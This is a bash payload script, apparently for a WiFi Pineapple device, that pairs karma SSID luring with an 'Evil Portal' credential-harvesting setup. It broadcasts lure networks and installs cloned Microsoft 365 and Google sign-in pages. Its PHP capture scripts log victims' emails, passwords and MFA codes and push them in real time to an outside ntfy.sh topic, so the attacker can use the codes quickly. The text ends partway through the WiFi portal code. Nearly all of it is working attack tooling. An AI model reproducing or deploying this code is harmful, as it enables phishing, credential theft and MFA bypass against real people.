#!/bin/bash
# Title: GARMR - Karma + Evil Portal Combined
# Description: SKOLL's karma luring + LOKI's credential harvesting in one payload
# Author: HaleHound
# Version: 4.7.0
# Category: user/attack
#
# Named after the blood-stained hound that guards the gates of HALE
#
# This payload COMBINES working code from:
# - SKOLL v1.2.0 (karma/SSID functions)
# - LOKI v1.1.0 (Evil Portal functions)
#
# NO custom implementations - uses proven working code only

# === ENSURE PATH INCLUDES SBIN (CRITICAL FOR NFT/DNSMASQ) ===
export PATH="/usr/sbin:/usr/bin:/sbin:/bin:$PATH"

# === CONFIGURATION ===
LOOT_DIR="/root/loot/garmr"
PORTAL_DIR="/root/portals"
INPUT=/dev/input/event0

# Portal IP - br-lan interface
PORTAL_IP="172.16.52.1"

# State
ORIGINAL_SSID=""

# Portal-specific SSIDs (option 2 - dynamic based on portal choice)
declare -a MICROSOFT_SSIDS=(
    "Microsoft WiFi"
    "Azure Guest"
    "Office 365 WiFi"
    "Microsoft Guest"
    "Outlook WiFi"
    "Teams Meeting WiFi"
)

declare -a GOOGLE_SSIDS=(
    "Google WiFi"
    "Google Guest"
    "Google Free WiFi"
    "Workspace WiFi"
    "Gmail Guest"
    "Google Starbucks"
)

declare -a GENERIC_SSIDS=(
    "Free WiFi"
    "Guest"
    "Airport WiFi"
    "Hotel WiFi"
    "Starbucks WiFi"
    "xfinitywifi"
    "attwifi"
    "McDonald's Free WiFi"
)

# All SSIDs for karma pool
declare -a ALL_KARMA_SSIDS=(
    "Microsoft WiFi"
    "Azure Guest"
    "Google WiFi"
    "Google Guest"
    "Free WiFi"
    "Guest"
    "xfinitywifi"
    "attwifi"
    "Starbucks WiFi"
    "Airport WiFi"
    "Hotel WiFi"
)

# Portal templates (from LOKI)
declare -A PORTAL_NAMES
PORTAL_NAMES[1]="Microsoft 365"
PORTAL_NAMES[2]="Google Workspace"
PORTAL_NAMES[3]="WiFi Captive Portal"

# Active SSID array (set based on portal choice)
declare -a ACTIVE_SSIDS

# NTFY settings (from LOKI)
NTFY_ENABLED=0
NTFY_TOPIC=""
NTFY_CONFIG_FILE="/root/.garmr_ntfy_topic"

# === CLEANUP ===
cleanup() {
    killall -9 TEXT_PICKER CONFIRMATION_DIALOG NUMBER_PICKER PROMPT 2>/dev/null
    killall -9 curl tail 2>/dev/null
    LED WHITE
}
trap cleanup EXIT INT TERM

# === LED PATTERNS ===
led_setup() { LED AMBER; }
led_network() { LED CYAN; }
led_active() { LED R 128 G 0 B 255; }
led_success() { LED GREEN; }
led_error() { LED RED; }

# === SOUNDS ===
play_start() { RINGTONE "garmr:d=4,o=5,b=140:g,8a,b,8c6,d6" & }
play_capture() { RINGTONE "capture:d=4,o=6,b=200:c,e,g,c7" & }

# ============================================================================
# SKOLL FUNCTIONS (VERBATIM FROM SKOLL v1.2.0)
# ============================================================================

# Get current Open AP SSID
get_current_ssid() {
    uci get wireless.wlan0open.ssid 2>/dev/null
}

# Set Open AP SSID (from SKOLL)
set_broadcast_ssid() {
    local ssid="$1"
    local max_attempts=3
    local attempt=0

    LOG "Setting SSID to: $ssid"

    # Save original for restoration
    [ -z "$ORIGINAL_SSID" ] && ORIGINAL_SSID=$(get_current_ssid)

    # Update UCI config - ENABLE interface, set OPEN (no password), set SSID
    uci set wireless.wlan0open.disabled='0'
    uci set wireless.wlan0open.encryption='none'
    uci set wireless.wlan0open.ssid="$ssid"
    uci commit wireless

    # Method 1: Try hostapd_cli for live change (fastest)
    if hostapd_cli -i wlan0open set ssid "$ssid" 2>/dev/null; then
        sleep 1
        local current=$(iwinfo wlan0open info 2>/dev/null | awk -F'"' '/ESSID:/ {print $2}')
        if [ "$current" = "$ssid" ]; then
            LOG "SSID set via hostapd_cli: $ssid"
            return 0
        fi
    fi

    # Method 2: Full wifi reload (slower but reliable)
    LOG "hostapd_cli failed, doing full wifi reload..."
    wifi reload 2>/dev/null

    # Wait for reload to complete
    while [ $attempt -lt $max_attempts ]; do
        sleep 3
        attempt=$((attempt + 1))

        local current=$(iwinfo wlan0open info 2>/dev/null | awk -F'"' '/ESSID:/ {print $2}')
        if [ "$current" = "$ssid" ]; then
            LOG "SSID verified: $ssid"
            return 0
        fi
        LOG "Waiting for SSID change... (attempt $attempt/$max_attempts)"
    done

    # Method 3: Nuclear option - restart hostapd
    LOG "wifi reload failed, restarting hostapd..."
    /etc/init.d/hostapd restart 2>/dev/null
    sleep 3

    local current=$(iwinfo wlan0open info 2>/dev/null | awk -F'"' '/ESSID:/ {print $2}')
    if [ "$current" = "$ssid" ]; then
        LOG "SSID verified after hostapd restart: $ssid"
        return 0
    fi

    LOG "WARNING: Could not verify SSID change to $ssid (current: $current)"
    return 1
}

# Start karma pool (from SKOLL)
start_karma_pool() {
    LOG "Starting karma SSID pool..."

    # Clear existing pool
    PINEAPPLE_SSID_POOL_CLEAR

    # Add all karma SSIDs (mix of Microsoft, Google, generic)
    for ssid in "${ALL_KARMA_SSIDS[@]}"; do
        PINEAPPLE_SSID_POOL_ADD "$ssid"
    done

    # Start karma responses
    PINEAPPLE_SSID_POOL_START

    LOG "Karma pool: ACTIVE (${#ALL_KARMA_SSIDS[@]} SSIDs)"
}

# Stop karma pool (from SKOLL)
stop_karma_pool() {
    LOG "Stopping karma pool..."
    PINEAPPLE_SSID_POOL_STOP
}

# ============================================================================
# LOKI FUNCTIONS (VERBATIM FROM LOKI v1.1.0)
# ============================================================================

detect_portal_ip() {
    local ip=$(ip addr show br-lan 2>/dev/null | grep -oE 'inet [0-9.]+' | cut -d' ' -f2)
    [ -n "$ip" ] && PORTAL_IP="$ip"
    LOG "Portal IP: $PORTAL_IP"
}

check_evil_portal() {
    # Check if Evil Portal infrastructure is installed
    if [ -f "/etc/init.d/evilportal" ]; then
        return 0
    fi

    if command -v php >/dev/null 2>&1 || command -v php8 >/dev/null 2>&1; then
        if command -v nginx >/dev/null 2>&1; then
            return 0
        fi
    fi

    if [ -d "/pineapple/ui/modules/evilportal" ]; then
        return 0
    fi

    return 1
}

# === NTFY CONFIGURATION (from LOKI) ===
configure_ntfy() {
    LOG ""
    LOG "=== PUSH NOTIFICATIONS ==="
    LOG ""

    # Check for saved topic
    if [ -f "$NTFY_CONFIG_FILE" ]; then
        NTFY_TOPIC=$(cat "$NTFY_CONFIG_FILE")
        LOG "Saved topic: $NTFY_TOPIC"

        local use_saved=$(CONFIRMATION_DIALOG "Use saved ntfy topic?\n\n$NTFY_TOPIC\n\nYES = Use this\nNO = Enter new topic")
        if [ "$use_saved" = "1" ]; then
            NTFY_ENABLED=1
            LOG "Using saved topic"

            # Send test notification for saved topic
            local test_notify=$(CONFIRMATION_DIALOG "Send test notification?\n\nTopic: $NTFY_TOPIC")
            if [ "$test_notify" = "1" ]; then
                LOG "Sending test to: $NTFY_TOPIC"
                curl -s -H "Title: GARMR Test" -H "Priority: high" -H "Tags: wolf,white_check_mark" -d "GARMR test - notifications working!" "https://ntfy.sh/$NTFY_TOPIC" &
                VIBRATE
                LOG "Test sent! Check your phone."
                sleep 2
            fi
            return 0
        fi
    fi

    # Ask if user wants push notifications
    local enable_ntfy=$(CONFIRMATION_DIALOG "Enable push notifications?\n\nGet instant alerts on your phone\nwhen credentials are captured!")

    if [ "$enable_ntfy" != "1" ]; then
        NTFY_ENABLED=0
        LOG "Push notifications disabled"
        return 0
    fi

    # Get topic from user
    local topic=$(TEXT_PICKER "ntfy topic name" "")
    case $? in
        $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED|$DUCKYSCRIPT_ERROR)
            topic="garmr-$(head -c 4 /dev/urandom | hexdump -e '4/1 "%02x"')"
            ;;
    esac

    [ -z "$topic" ] && topic="garmr-$(head -c 4 /dev/urandom | hexdump -e '4/1 "%02x"')"

    NTFY_TOPIC="$topic"
    NTFY_ENABLED=1

    # Save for future use
    echo "$NTFY_TOPIC" > "$NTFY_CONFIG_FILE"

    LOG "Topic set: $NTFY_TOPIC"

    # Send test notification
    local test_notify=$(CONFIRMATION_DIALOG "Send test notification?\n\nMake sure you're subscribed to:\nntfy.sh/$NTFY_TOPIC")
    if [ "$test_notify" = "1" ]; then
        LOG "Sending test to: $NTFY_TOPIC"
        curl -s -H "Title: GARMR Test" -H "Priority: high" -H "Tags: wolf,white_check_mark" -d "GARMR test - notifications working!" "https://ntfy.sh/$NTFY_TOPIC" &
        VIBRATE
        LOG "Test sent! Check your phone."
        sleep 2
    fi

    return 0
}

# === SHARED BASE INSTALLATION (from LOKI) ===
install_shared_base() {
    local shared_path="$PORTAL_DIR/garmr_shared"

    [ -f "$shared_path/MyPortal.php" ] && [ -f "$shared_path/helper.php" ] && return 0

    LOG "Installing shared portal base..."
    mkdir -p "$shared_path"

    # MyPortal.php - Portal class used by all portals
    cat > "$shared_path/MyPortal.php" << 'PORTALEOF'
<?php namespace evilportal;

class MyPortal extends Portal
{
    public function handleAuthorization()
    {
        if (isset($this->request->target)) {
            parent::handleAuthorization();
        }
    }

    public function authorizeClient($clientIP)
    {
        return parent::authorizeClient($clientIP);
    }

    public function onSuccess()
    {
        $this->notify("GARMR: Client authorized after capture");
    }
}
PORTALEOF

    # helper.php - Helper functions
    cat > "$shared_path/helper.php" << 'HELPEOF'
<?php
function getClientMac($clientIP) {
    return trim(exec("grep " . escapeshellarg($clientIP) . " /tmp/dhcp.leases | awk '{print $2}'"));
}

function getClientHostName($clientIP) {
    return trim(exec("grep " . escapeshellarg($clientIP) . " /tmp/dhcp.leases | awk '{print $4}'"));
}
HELPEOF

    chmod -R 755 "$shared_path"
    LOG "Shared base installed"
}

# === MICROSOFT PORTAL (from LOKI - VERBATIM) ===
install_microsoft_portal() {
    local portal_path="$PORTAL_DIR/garmr_microsoft"
    mkdir -p "$portal_path"

    LOG "Installing Microsoft 365 portal..."

    # index.php - Main phishing page (from LOKI)
    cat > "$portal_path/index.php" << 'MSEOF'
<?php
header("Cache-Control: no-store, no-cache, must-revalidate");
$destination = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
require_once('helper.php');
$stage = isset($_GET['stage']) ? $_GET['stage'] : 'email';
$email = isset($_GET['email']) ? htmlspecialchars($_GET['email']) : '';
?>
<!DOCTYPE html>
<html>
<head>
    <title>Sign in to your account</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', sans-serif; background: #f2f2f2; min-height: 100vh; display: flex; align-items: center; justify-content: center; }
        .container { background: white; width: 440px; padding: 44px; box-shadow: 0 2px 6px rgba(0,0,0,0.2); }
        .logo { width: 108px; margin-bottom: 16px; }
        h1 { font-size: 24px; font-weight: 600; margin-bottom: 12px; color: #1b1b1b; }
        .email-display { font-size: 14px; color: #666; margin-bottom: 24px; }
        input[type="email"], input[type="password"], input[type="text"] {
            width: 100%; padding: 10px 8px; font-size: 15px; border: 1px solid #666;
            margin-bottom: 16px; outline: none;
        }
        input:focus { border-color: #0067b8; }
        .submit-btn {
            background: #0067b8; color: white; border: none; padding: 10px 20px;
            font-size: 15px; cursor: pointer; float: right;
        }
        .submit-btn:hover { background: #005a9e; }
        .link { color: #0067b8; text-decoration: none; font-size: 13px; display: block; margin-bottom: 8px; }
        .mfa-info { font-size: 13px; color: #666; margin-bottom: 16px; line-height: 1.5; }
        .mfa-code { letter-spacing: 8px; font-size: 24px; text-align: center; }
        .error { color: #d83b01; font-size: 13px; margin-bottom: 12px; }
        .loader { display: none; text-align: center; padding: 20px; }
        .loader.active { display: block; }
        .spinner { border: 3px solid #f3f3f3; border-top: 3px solid #0067b8; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 0 auto 12px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
<div class="container">
    <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMDgiIGhlaWdodD0iMjQiPjxwYXRoIGZpbGw9IiNmMjUwMjIiIGQ9Ik0wIDBoMTEuNXYxMS41SDB6Ii8+PHBhdGggZmlsbD0iIzdmYmEwMCIgZD0iTTEyLjUgMEgyNHYxMS41SDEyLjV6Ii8+PHBhdGggZmlsbD0iIzAwYTRlZiIgZD0iTTAgMTIuNWgxMS41VjI0SDB6Ii8+PHBhdGggZmlsbD0iI2ZmYjkwMCIgZD0iTTEyLjUgMTIuNUgyNFYyNEgxMi41eiIvPjwvc3ZnPg==" class="logo" alt="Microsoft">

    <?php if($stage == 'email'): ?>
    <h1>Sign in</h1>
    <form method="POST" action="capture.php">
        <input type="hidden" name="target" value="<?=$destination?>">
        <input type="hidden" name="stage" value="email">
        <input type="email" name="email" placeholder="Email, phone, or Skype" required autofocus>
        <a href="#" class="link">Can't access your account?</a>
        <a href="#" class="link">Sign-in options</a>
        <button type="submit" class="submit-btn">Next</button>
    </form>

    <?php elseif($stage == 'password'): ?>
    <a href="?stage=email" class="link" style="margin-bottom:16px;">&larr; <?=$email?></a>
    <h1>Enter password</h1>
    <form method="POST" action="capture.php">
        <input type="hidden" name="target" value="<?=$destination?>">
        <input type="hidden" name="stage" value="password">
        <input type="hidden" name="email" value="<?=$email?>">
        <input type="password" name="password" placeholder="Password" required autofocus>
        <a href="#" class="link">Forgot my password</a>
        <button type="submit" class="submit-btn">Sign in</button>
    </form>

    <?php elseif($stage == 'mfa'): ?>
    <h1>Verify your identity</h1>
    <p class="mfa-info">Enter the code from your authenticator app or SMS.</p>
    <form method="POST" action="capture.php" id="mfaForm">
        <input type="hidden" name="target" value="<?=$destination?>">
        <input type="hidden" name="stage" value="mfa">
        <input type="hidden" name="email" value="<?=$email?>">
        <input type="text" name="mfa_code" class="mfa-code" placeholder="______" maxlength="6" pattern="[0-9]{6}" required autofocus>
        <a href="#" class="link">I can't use my authenticator app right now</a>
        <button type="submit" class="submit-btn">Verify</button>
    </form>
    <div class="loader" id="loader">
        <div class="spinner"></div>
        <p>Verifying...</p>
    </div>

    <?php elseif($stage == 'complete'): ?>
    <h1>Verification complete</h1>
    <p class="mfa-info">Please wait while we redirect you...</p>
    <div class="loader active">
        <div class="spinner"></div>
    </div>
    <script>setTimeout(function(){window.location='https://www.office.com';},3000);</script>

    <?php endif; ?>
</div>
<script>
document.getElementById('mfaForm')?.addEventListener('submit', function(e) {
    document.getElementById('loader').classList.add('active');
    this.style.display = 'none';
});
</script>
</body>
</html>
MSEOF

    # capture.php - WITH PROPER PORTAL INTEGRATION (from LOKI)
    cat > "$portal_path/capture.php" << CAPTEOF
<?php
namespace evilportal;

header("Cache-Control: no-store, no-cache, must-revalidate");
require_once('/pineapple/ui/modules/evilportal/assets/api/Portal.php');
require_once('MyPortal.php');

// === NTFY PUSH NOTIFICATION CONFIG ===
\$ntfy_enabled = ${NTFY_ENABLED};
\$ntfy_topic = "${NTFY_TOPIC}";

function send_ntfy(\$title, \$message, \$priority, \$tags, \$click_url = null) {
    global \$ntfy_enabled, \$ntfy_topic;
    if (!\$ntfy_enabled || empty(\$ntfy_topic)) return;

    \$headers = [
        "Title: \$title",
        "Priority: \$priority",
        "Tags: \$tags"
    ];

    if (\$click_url) {
        \$headers[] = "Click: \$click_url";
        \$headers[] = "Actions: view, Open Login, \$click_url";
    }

    \$ch = curl_init();
    curl_setopt(\$ch, CURLOPT_URL, "https://ntfy.sh/\$ntfy_topic");
    curl_setopt(\$ch, CURLOPT_POST, true);
    curl_setopt(\$ch, CURLOPT_POSTFIELDS, \$message);
    curl_setopt(\$ch, CURLOPT_HTTPHEADER, \$headers);
    curl_setopt(\$ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt(\$ch, CURLOPT_TIMEOUT, 5);
    curl_exec(\$ch);
    curl_close(\$ch);
}

\$loot_file = '/root/loot/garmr/credentials.txt';
\$stage = isset(\$_POST['stage']) ? \$_POST['stage'] : '';
\$email = isset(\$_POST['email']) ? \$_POST['email'] : '';
\$password = isset(\$_POST['password']) ? \$_POST['password'] : '';
\$mfa_code = isset(\$_POST['mfa_code']) ? \$_POST['mfa_code'] : '';
\$target = isset(\$_POST['target']) ? \$_POST['target'] : '/';
\$client_ip = \$_SERVER['REMOTE_ADDR'];
\$timestamp = date('Y-m-d H:i:s');

@mkdir('/root/loot/garmr', 0755, true);

if (\$stage == 'email' && !empty(\$email)) {
    file_put_contents(\$loot_file, "[\$timestamp] EMAIL: \$email (IP: \$client_ip)\n", FILE_APPEND);
    send_ntfy("GARMR: Email Captured", "Target: \$email\nIP: \$client_ip", "default", "envelope,eyes");
    header("Location: index.php?stage=password&email=" . urlencode(\$email));
    exit;
}

if (\$stage == 'password' && !empty(\$email) && !empty(\$password)) {
    file_put_contents(\$loot_file, "[\$timestamp] PASSWORD: \$password (Email: \$email)\n", FILE_APPEND);
    send_ntfy("GARMR: CREDS CAPTURED!", "Email: \$email\nPassword: \$password\n\n=== TAP TO LOGIN ===", "urgent", "rotating_light,key", "https://login.microsoftonline.com");
    exec("PYTHONPATH=/usr/lib/pineapple; export PYTHONPATH; /usr/bin/python3 /usr/bin/notify info 'GARMR: Credentials captured for \$email' evilportal &");
    header("Location: index.php?stage=mfa&email=" . urlencode(\$email));
    exit;
}

if (\$stage == 'mfa' && !empty(\$mfa_code)) {
    file_put_contents(\$loot_file, "[\$timestamp] MFA_CODE: \$mfa_code (Email: \$email)\n", FILE_APPEND);
    file_put_contents(\$loot_file, "[\$timestamp] === COMPLETE CAPTURE ===\n\n", FILE_APPEND);
    send_ntfy("GARMR: MFA CODE!", "Code: \$mfa_code\nEmail: \$email\n\n=== 30 SECONDS! ===", "urgent", "stopwatch,skull");
    exec("PYTHONPATH=/usr/lib/pineapple; export PYTHONPATH; /usr/bin/python3 /usr/bin/notify critical 'GARMR: MFA TOKEN \$mfa_code' evilportal &");

    // CRITICAL: Authorize the client so they can browse!
    \$portal = new MyPortal((object)\$_POST);
    \$portal->authorizeClient(\$client_ip);

    header("Location: index.php?stage=complete&email=" . urlencode(\$email));
    exit;
}

header("Location: index.php");
CAPTEOF

    # Copy shared PHP files
    cp "$PORTAL_DIR/garmr_shared/MyPortal.php" "$portal_path/"
    cp "$PORTAL_DIR/garmr_shared/helper.php" "$portal_path/"

    cat > "$portal_path/garmr_microsoft.ep" << 'EPEOF'
{
  "name": "garmr_microsoft",
  "type": "advanced"
}
EPEOF

    # Captive portal detection files
    cat > "$portal_path/generate_204.php" << 'GENEOF'
<?php header("Content-Type: text/html"); header("Location: /"); exit; ?>
GENEOF

    cat > "$portal_path/hotspot-detect.html" << GENEOF
<!DOCTYPE html><html><head><meta http-equiv="refresh" content="0;url=http://${PORTAL_IP}/"></head><body></body></html>
GENEOF

    chmod -R 755 "$portal_path"
    LOG "Microsoft 365 portal installed"
}

# === GOOGLE PORTAL (from LOKI - VERBATIM) ===
install_google_portal() {
    local portal_path="$PORTAL_DIR/garmr_google"
    mkdir -p "$portal_path"

    LOG "Installing Google Workspace portal..."

    cat > "$portal_path/index.php" << 'GEOF'
<?php
header("Cache-Control: no-store, no-cache, must-revalidate");
$destination = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
require_once('helper.php');
$stage = isset($_GET['stage']) ? $_GET['stage'] : 'email';
$email = isset($_GET['email']) ? htmlspecialchars($_GET['email']) : '';
?>
<!DOCTYPE html>
<html>
<head>
    <title>Sign in - Google Accounts</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Google Sans', Roboto, Arial, sans-serif; background: #fff; min-height: 100vh; display: flex; align-items: center; justify-content: center; }
        .container { width: 450px; padding: 48px 40px 36px; border: 1px solid #dadce0; border-radius: 8px; }
        .logo { width: 75px; margin: 0 auto 16px; display: block; }
        h1 { font-size: 24px; font-weight: 400; text-align: center; margin-bottom: 8px; color: #202124; }
        .subtitle { text-align: center; font-size: 16px; color: #5f6368; margin-bottom: 32px; }
        .email-chip { background: #f1f3f4; border-radius: 16px; padding: 4px 8px 4px 4px; display: inline-flex; align-items: center; margin-bottom: 24px; font-size: 14px; }
        input[type="email"], input[type="password"], input[type="text"] {
            width: 100%; padding: 13px 15px; font-size: 16px; border: 1px solid #dadce0;
            border-radius: 4px; margin-bottom: 8px; outline: none;
        }
        input:focus { border: 2px solid #1a73e8; padding: 12px 14px; }
        .input-label { font-size: 12px; color: #5f6368; margin-bottom: 24px; display: block; }
        .submit-btn {
            background: #1a73e8; color: white; border: none; padding: 10px 24px;
            font-size: 14px; font-weight: 500; cursor: pointer; border-radius: 4px;
            float: right;
        }
        .submit-btn:hover { background: #1557b0; }
        .link { color: #1a73e8; text-decoration: none; font-size: 14px; font-weight: 500; }
        .footer { display: flex; justify-content: space-between; margin-top: 32px; clear: both; padding-top: 24px; }
        .mfa-info { font-size: 14px; color: #5f6368; margin-bottom: 24px; line-height: 1.5; }
        .mfa-code { letter-spacing: 12px; font-size: 28px; text-align: center; font-weight: 500; }
    </style>
</head>
<body>
<div class="container">
    <svg class="logo" viewBox="0 0 272 92" xmlns="http://www.w3.org/2000/svg"><path fill="#4285F4" d="M115.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18C71.25 34.32 81.24 25 93.5 25s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44S80.99 39.2 80.99 47.18c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z"/><path fill="#EA4335" d="M163.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18c0-12.85 9.99-22.18 22.25-22.18s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44s-12.51 5.46-12.51 13.44c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z"/><path fill="#FBBC05" d="M209.75 26.34v39.82c0 16.38-9.66 23.07-21.08 23.07-10.75 0-17.22-7.19-19.66-13.07l8.48-3.53c1.51 3.61 5.21 7.87 11.17 7.87 7.31 0 11.84-4.51 11.84-13v-3.19h-.34c-2.18 2.69-6.38 5.04-11.68 5.04-11.09 0-21.25-9.66-21.25-22.09 0-12.52 10.16-22.26 21.25-22.26 5.29 0 9.49 2.35 11.68 4.96h.34v-3.61h9.25zm-8.56 20.92c0-7.81-5.21-13.52-11.84-13.52-6.72 0-12.35 5.71-12.35 13.52 0 7.73 5.63 13.36 12.35 13.36 6.63 0 11.84-5.63 11.84-13.36z"/><path fill="#4285F4" d="M225 3v65h-9.5V3h9.5z"/><path fill="#34A853" d="M262.02 54.48l7.56 5.04c-2.44 3.61-8.32 9.83-18.48 9.83-12.6 0-22.01-9.74-22.01-22.18 0-13.19 9.49-22.18 20.92-22.18 11.51 0 17.14 9.16 18.98 14.11l1.01 2.52-29.65 12.28c2.27 4.45 5.8 6.72 10.75 6.72 4.96 0 8.4-2.44 10.92-6.14zm-23.27-7.98l19.82-8.23c-1.09-2.77-4.37-4.7-8.23-4.7-4.95 0-11.84 4.37-11.59 12.93z"/><path fill="#4285F4" d="M35.29 41.41V32H67c.31 1.64.47 3.58.47 5.68 0 7.06-1.93 15.79-8.15 22.01-6.05 6.3-13.78 9.66-24.02 9.66C16.32 69.35.36 53.89.36 34.91.36 15.93 16.32.47 35.3.47c10.5 0 17.98 4.12 23.6 9.49l-6.64 6.64c-4.03-3.78-9.49-6.72-16.97-6.72-13.86 0-24.7 11.17-24.7 25.03 0 13.86 10.84 25.03 24.7 25.03 8.99 0 14.11-3.61 17.39-6.89 2.66-2.66 4.41-6.46 5.1-11.65l-22.49.01z"/></svg>

    <?php if($stage == 'email'): ?>
    <h1>Sign in</h1>
    <p class="subtitle">Use your Google Account</p>
    <form method="POST" action="capture.php">
        <input type="hidden" name="target" value="<?=$destination?>">
        <input type="hidden" name="stage" value="email">
        <input type="email" name="email" placeholder="Email or phone" required autofocus>
        <span class="input-label"><a href="#" class="link">Forgot email?</a></span>
        <div class="footer">
            <a href="#" class="link">Create account</a>
            <button type="submit" class="submit-btn">Next</button>
        </div>
    </form>

    <?php elseif($stage == 'password'): ?>
    <h1>Welcome</h1>
    <div class="email-chip"><?=$email?></div>
    <form method="POST" action="capture.php">
        <input type="hidden" name="target" value="<?=$destination?>">
        <input type="hidden" name="stage" value="password">
        <input type="hidden" name="email" value="<?=$email?>">
        <input type="password" name="password" placeholder="Enter your password" required autofocus>
        <span class="input-label"><a href="#" class="link">Forgot password?</a></span>
        <div class="footer">
            <span></span>
            <button type="submit" class="submit-btn">Next</button>
        </div>
    </form>

    <?php elseif($stage == 'mfa'): ?>
    <h1>2-Step Verification</h1>
    <p class="mfa-info">Enter the verification code from your phone.</p>
    <form method="POST" action="capture.php">
        <input type="hidden" name="target" value="<?=$destination?>">
        <input type="hidden" name="stage" value="mfa">
        <input type="hidden" name="email" value="<?=$email?>">
        <input type="text" name="mfa_code" class="mfa-code" placeholder="G-" maxlength="6" pattern="[0-9]{6}" required autofocus>
        <span class="input-label"><a href="#" class="link">Try another way</a></span>
        <div class="footer">
            <span></span>
            <button type="submit" class="submit-btn">Next</button>
        </div>
    </form>

    <?php elseif($stage == 'complete'): ?>
    <h1>Verification complete</h1>
    <p class="mfa-info">Redirecting to Google...</p>
    <script>setTimeout(function(){window.location='https://www.google.com';},2000);</script>
    <?php endif; ?>
</div>
</body>
</html>
GEOF

    # capture.php for Google
    cat > "$portal_path/capture.php" << CAPTEOF
<?php
namespace evilportal;

header("Cache-Control: no-store, no-cache, must-revalidate");
require_once('/pineapple/ui/modules/evilportal/assets/api/Portal.php');
require_once('MyPortal.php');

\$ntfy_enabled = ${NTFY_ENABLED};
\$ntfy_topic = "${NTFY_TOPIC}";

function send_ntfy(\$title, \$message, \$priority, \$tags, \$click_url = null) {
    global \$ntfy_enabled, \$ntfy_topic;
    if (!\$ntfy_enabled || empty(\$ntfy_topic)) return;

    \$headers = ["Title: \$title", "Priority: \$priority", "Tags: \$tags"];
    if (\$click_url) {
        \$headers[] = "Click: \$click_url";
    }

    \$ch = curl_init();
    curl_setopt(\$ch, CURLOPT_URL, "https://ntfy.sh/\$ntfy_topic");
    curl_setopt(\$ch, CURLOPT_POST, true);
    curl_setopt(\$ch, CURLOPT_POSTFIELDS, \$message);
    curl_setopt(\$ch, CURLOPT_HTTPHEADER, \$headers);
    curl_setopt(\$ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt(\$ch, CURLOPT_TIMEOUT, 5);
    curl_exec(\$ch);
    curl_close(\$ch);
}

\$loot_file = '/root/loot/garmr/credentials.txt';
\$stage = isset(\$_POST['stage']) ? \$_POST['stage'] : '';
\$email = isset(\$_POST['email']) ? \$_POST['email'] : '';
\$password = isset(\$_POST['password']) ? \$_POST['password'] : '';
\$mfa_code = isset(\$_POST['mfa_code']) ? \$_POST['mfa_code'] : '';
\$client_ip = \$_SERVER['REMOTE_ADDR'];
\$timestamp = date('Y-m-d H:i:s');

@mkdir('/root/loot/garmr', 0755, true);

if (\$stage == 'email' && !empty(\$email)) {
    file_put_contents(\$loot_file, "[\$timestamp] EMAIL: \$email (IP: \$client_ip)\n", FILE_APPEND);
    send_ntfy("GARMR: Email", "Target: \$email", "default", "envelope");
    header("Location: index.php?stage=password&email=" . urlencode(\$email));
    exit;
}

if (\$stage == 'password' && !empty(\$email) && !empty(\$password)) {
    file_put_contents(\$loot_file, "[\$timestamp] PASSWORD: \$password (Email: \$email)\n", FILE_APPEND);
    send_ntfy("GARMR: GOOGLE CREDS!", "Email: \$email\nPassword: \$password", "urgent", "rotating_light,key", "https://accounts.google.com");
    exec("PYTHONPATH=/usr/lib/pineapple; export PYTHONPATH; /usr/bin/python3 /usr/bin/notify info 'GARMR: Google creds for \$email' evilportal &");
    header("Location: index.php?stage=mfa&email=" . urlencode(\$email));
    exit;
}

if (\$stage == 'mfa' && !empty(\$mfa_code)) {
    file_put_contents(\$loot_file, "[\$timestamp] MFA_CODE: \$mfa_code (Email: \$email)\n", FILE_APPEND);
    file_put_contents(\$loot_file, "[\$timestamp] === COMPLETE CAPTURE ===\n\n", FILE_APPEND);
    send_ntfy("GARMR: MFA CODE!", "Code: \$mfa_code\n\n30 SECONDS!", "urgent", "stopwatch,skull");
    exec("PYTHONPATH=/usr/lib/pineapple; export PYTHONPATH; /usr/bin/python3 /usr/bin/notify critical 'GARMR: MFA \$mfa_code' evilportal &");

    \$portal = new MyPortal((object)\$_POST);
    \$portal->authorizeClient(\$client_ip);

    header("Location: index.php?stage=complete");
    exit;
}

header("Location: index.php");
CAPTEOF

    cp "$PORTAL_DIR/garmr_shared/MyPortal.php" "$portal_path/"
    cp "$PORTAL_DIR/garmr_shared/helper.php" "$portal_path/"

    cat > "$portal_path/garmr_google.ep" << 'EPEOF'
{ "name": "garmr_google", "type": "advanced" }
EPEOF

    cat > "$portal_path/generate_204.php" << 'GENEOF'
<?php header("Content-Type: text/html"); header("Location: /"); exit; ?>
GENEOF

    cat > "$portal_path/hotspot-detect.html" << GENEOF
<!DOCTYPE html><html><head><meta http-equiv="refresh" content="0;url=http://${PORTAL_IP}/"></head><body></body></html>
GENEOF

    chmod -R 755 "$portal_path"
    LOG "Google Workspace portal installed"
}

# === WIFI CAPTIVE PORTAL (from LOKI - VERBATIM) ===
install_wifi_portal() {
    local portal_path="$PORTAL_DIR/garmr_wifi"
    mkdir -p "$portal_path"

    LOG "Installing WiFi captive portal..."

    cat > "$portal_path/index.php" << 'WIFIEOF'
<?php
